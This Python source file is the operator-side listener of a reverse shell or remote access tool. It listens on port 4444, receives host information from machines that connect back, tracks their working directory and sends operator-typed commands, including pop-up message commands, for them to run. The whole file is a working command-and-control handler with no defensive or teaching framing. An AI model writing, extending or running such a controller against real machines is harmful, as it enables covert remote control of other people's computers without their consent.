from socket import *
from os import system, name
import sys
import time

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def send_full_message(client_socket, message):
    try:
        message_length = str(len(message)).zfill(10)
        client_socket.send(message_length.encode())

        client_socket.send(message.encode())
    except Exception as e:
        print(f"Error sending message: {e}")
        return False
    return True

def receive_full_message(client_socket):
    try:
        message_length = int(client_socket.recv(10).decode())
        data = b''
        while len(data) < message_length:
            packet = client_socket.recv(message_length - len(data))
            if not packet:
                return None
            data += packet
        return data.decode()
    except ValueError:
        return None

def handle_client(client_socket, addr):
    print()
    print("Connected -> " + str(addr))

    infoReceiver = receive_full_message(client_socket)
    if (infoReceiver):
        print(infoReceiver)

    send_full_message(client_socket, "getcwd")
    current_directory = receive_full_message(client_socket)

    if current_directory is None:
        print(f"Client {addr} disconnected during initial setup")
        client_socket.close()
        return

    while True:
        try:
            receiver = receive_full_message(client_socket)
            if receiver is None:
                print(f"\nClient {addr} has disconnected")
                break

            if receiver.startswith("DIR:"):
                dir_end_idx = receiver.find('\n')
                current_directory = receiver[4:]
                receiver = receiver[dir_end_idx+1:].strip()

            if (receiver) and not (receiver.startswith("DIR:")):
                print(receiver)

            cmd = input(f"{current_directory}> ")
            if cmd in ["exit", "quit", 'q']:
                send_full_message(client_socket, cmd)
                break
            elif cmd.lower().startswith("msgbox"):
                send_full_message(client_socket, cmd)
            elif cmd in ["clear", "cls"]:
                clear()
            else:
                send_full_message(client_socket, cmd)

        except (ConnectionResetError, BrokenPipeError):
            print(f"Connection lost to {addr}")
            break

    client_socket.close()
    print(f"Connection closed with {addr}\n")

def main():
    ip = "127.0.0.1"
    port = 4444

    connection = socket(AF_INET, SOCK_STREAM)
    connection.bind((ip, port))
    connection.listen(5)

    print(f'[+] Listening on {ip}:{port}')

    while True:
        try:
            client, addr = connection.accept()
            handle_client(client, addr)
        except KeyboardInterrupt:
            print("\nServer shutting down.")
            break

    connection.close()

if __name__ == "__main__":
    main()
